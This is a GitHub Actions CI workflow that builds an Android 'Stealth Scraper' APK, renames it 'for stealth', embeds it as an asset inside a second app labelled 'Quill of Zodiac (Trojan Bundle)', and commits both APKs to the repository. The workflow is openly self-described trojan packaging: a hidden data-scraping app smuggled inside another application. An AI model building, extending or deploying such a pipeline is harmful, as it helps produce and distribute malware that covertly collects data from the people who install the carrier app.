name: Build Hive-Network APKs

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build-scraper:
    name: Build Stealth Scraper (systeminternet)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Set up Java
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Install Briefcase
        run: |
          pip install briefcase

      - name: Accept Android SDK licenses
        run: |
          yes | ${ANDROID_HOME}/cmdline-tools/latest/bin/sdkmanager --licenses || true

      - name: Build Scraper APK
        run: |
          cd mobile_app/system_internet
          python -m briefcase package android --no-input

      - name: Upload Scraper APK
        uses: actions/upload-artifact@v4
        with:
          name: trojanhorseofdestiny-apk
          path: mobile_app/system_internet/build/trojanhorseofdestiny/android/gradle/app/build/outputs/apk/debug/*.apk

  build-trojan:
    name: Build Quill of Zodiac (Trojan Bundle)
    needs: build-scraper
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4

      - name: Download Scraper APK
        uses: actions/download-artifact@v4
        with:
          name: trojanhorseofdestiny-apk
          path: mobile_app/quill_dashboard/assets

      - name: Rename Scraper for Stealth
        run: |
          mkdir -p mobile_app/quill_dashboard/assets
          mv mobile_app/quill_dashboard/assets/*.apk mobile_app/quill_dashboard/assets/trojanhorseofdestiny.apk

      - name: Build Quill of Zodiac APK
        run: |
          cd mobile_app/quill_dashboard
          if [ -f gradlew ]; then
            chmod +x gradlew
            ./gradlew assembleDebug
          else
            echo "Gradle wrapper not found, skipping build"
          fi

      - name: Commit and Push APKs
        run: |
          git config --global user.name "github-actions[bot]"
          git config --global user.email "github-actions[bot]@users.noreply.github.com"
          mkdir -p bin
          cp mobile_app/quill_dashboard/app/build/outputs/apk/debug/*.apk bin/QuillOfZodiac.apk || true
          cp mobile_app/quill_dashboard/assets/trojanhorseofdestiny.apk bin/system_internet.apk || true
          git add bin/*.apk
          git commit -m "Update built APKs [skip ci]" || echo "No changes to commit"
          git push

